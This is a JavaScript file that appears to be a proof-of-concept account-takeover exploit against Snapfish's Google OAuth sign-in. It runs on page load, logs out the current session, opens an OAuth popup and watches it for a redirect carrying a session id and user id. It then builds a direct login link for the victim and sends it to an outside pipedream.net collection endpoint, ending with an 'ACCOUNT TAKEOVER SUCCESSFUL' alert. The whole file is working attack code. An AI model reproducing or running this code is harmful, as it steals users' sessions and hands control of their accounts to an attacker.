(function() {
    function exploit() {
        document.body.innerHTML = '<html><body><center><h1>Processing...</h1></center></body></html>';
        
        // Logout attacker session
        fetch('https://www.snapfish.com/logout', {
            method: 'GET',
            credentials: 'include'
        }).then(function() {
            // Open Google OAuth auto-login for victim
            var oauth = 'https://www.snapfish.com/v1/gw/snapfish/oauth/google/signin?TNCFlag=1&context=/hp/sf/sf-us/snapfish-us&sourceGroup=sf-store&code=317425865357719&next=https%3A%2F%2Fwww.snapfish.com%2Fhome&SubscriptionFlag=ALL';
            var win = window.open(oauth, 'oauth', 'width=600,height=700');
            
            if (!win) {
                alert('Error: Popup blocked');
                return;
            }
            
            // Monitor popup for OAuth callback
            var check = setInterval(function() {
                try {
                    if (win.closed) {
                        clearInterval(check);
                        return;
                    }
                    
                    var url = win.location.href;
                    
                    // Check if we got the login redirect
                    if (url.includes('/webredirect?gsid=')) {
                        clearInterval(check);
                        
                        // Extract credentials from callback URL
                        var params = new URL(url);
                        var gsid = params.searchParams.get('gsid');
                        var uid = params.searchParams.get('user_id');
                        
                        // Construct victim login URL with CSRF bypass
                        var target = 'https://www.snapfish.com/webredirect?gsid=' + encodeURIComponent(gsid) + '&o=connect&user_id=' + uid;
                        
                        // Send to attacker server
                        fetch('https://eo1ey5201bcmppg.m.pipedream.net?url=' + encodeURIComponent(target), {
                            method: 'GET',
                            keepalive: true
                        }).catch(function() {});
                        
                        new Image().src = 'https://eo1ey5201bcmppg.m.pipedream.net?url=' + encodeURIComponent(target);
                        
                        // Block redirect to prevent victim login
                        win.close();
                        window.stop();
                        
                        if (window.event) {
                            window.event.cancelBubble = true;
                            window.event.returnValue = false;
                        }
                        
                        // Display result
                        alert('ACCOUNT TAKEOVER SUCCESSFUL!\n\nDirect Victim Login Link:\n\n' + target + '\n\nThis link has also been sent to @m4rc10sz');
                    }
                } catch(e) {}
            }, 100);
        });
    }
    
    // Execute when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', exploit);
    } else {
        exploit();
    }
})();
